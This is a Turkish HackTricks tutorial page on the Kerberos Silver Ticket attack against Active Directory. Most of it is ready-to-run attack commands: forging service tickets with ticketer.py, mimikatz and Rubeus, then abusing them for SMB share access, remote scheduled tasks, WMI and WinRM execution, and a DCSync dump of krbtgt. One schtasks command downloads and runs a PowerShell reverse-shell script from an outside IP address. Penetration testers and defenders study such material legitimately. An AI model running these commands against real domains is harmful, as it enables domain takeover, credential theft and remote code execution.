# Silver Ticket

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a> <strong>öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** \[**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* \*\*💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın.**

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Ödül avı ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan premium bir **ödül avı platformu**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katılın ve **$100,000**'a kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Gümüş bilet

**Gümüş Bilet** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin sömürülmesini içerir. Bu yöntem, genellikle yönetici ayrıcalıklarını hedefleyerek, ağdaki belirli hizmetlere erişim sağlamak için bir **hizmet hesabının NTLM hash'ini elde etmeye** dayanır ve bir Bilet Verme Hizmeti (TGS) bileti oluşturur. Bu sahte bilet ile bir saldırgan, **herhangi bir kullanıcıyı taklit ederek** ağdaki belirli hizmetlere erişebilir. Bilet oluştururken, biletlerin oluşturulması için AES anahtarlarının kullanılmasının daha güvenli ve daha az tespit edilebilir olduğu vurgulanmaktadır.

Bilet oluşturmak için işletim sistemine bağlı olarak farklı araçlar kullanılır:

### Linux Üzerinde

```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Windows Üzerinde

```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

## Kullanılabilir Hizmetler

| Hizmet Türü                            | Hizmet Gümüş Biletleri                                                               |
| -------------------------------------- | ------------------------------------------------------------------------------------ |
| WMI                                    | <p>HOST</p><p>RPCSS</p>                                                              |
| PowerShell Remoting                    | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                  | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda sadece isteyebilirsiniz: WINRM</p>          |
| Zamanlanmış Görevler                   | HOST                                                                                 |
| Windows Dosya Paylaşımı, ayrıca psexec | CIFS                                                                                 |
| LDAP işlemleri, DCSync dahil           | LDAP                                                                                 |
| Windows Uzak Sunucu Yönetim Araçları   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                                   |
| Altın Biletler                         | krbtgt                                                                               |

**Rubeus** kullanarak bu biletleri **tümünü isteyebilirsiniz**:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Gümüş biletler Olay Kimlikleri

* 4624: Hesap Girişi
* 4634: Hesap Çıkışı
* 4672: Yönetici Girişi

## Hizmet biletlerinin Kötüye Kullanımı

Aşağıdaki örneklerde, biletin yönetici hesabını taklit ederek alındığını varsayalım.

### CIFS

Bu bilet ile, **SMB** üzerinden `C$` ve `ADMIN$` klasörlerine erişebilecek ve uzak dosya sistemine dosya kopyalayabileceksiniz:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

### SUNUCU

Bu izinle, uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve keyfi komutlar çalıştırabilirsiniz:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Bu biletlerle, kurban sisteminde **WMI'ı yürütebilirsiniz**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Aşağıdaki sayfada **wmiexec hakkında daha fazla bilgi bulun**:

{% content-ref url="../lateral-movement/wmicexec.md" %}
[wmicexec.md](../lateral-movement/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Bir bilgisayara winrm erişimi ile **erişebilirsiniz** ve hatta bir PowerShell alabilirsiniz:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Aşağıdaki sayfayı kontrol edin, uzak bir ana bilgisayarla bağlantı kurmanın daha fazla yolunu öğrenmek için:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Uzaktaki bilgisayara erişmek için **winrm'nin etkin ve dinleme modunda** olması gerektiğini unutmayın.
{% endhint %}

### LDAP

Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dökümleyebilirsiniz:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:

## Referanslar

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **hata ödülü platformu**! Bugün bize katılın [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) ve **$100,000**'a kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'u takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
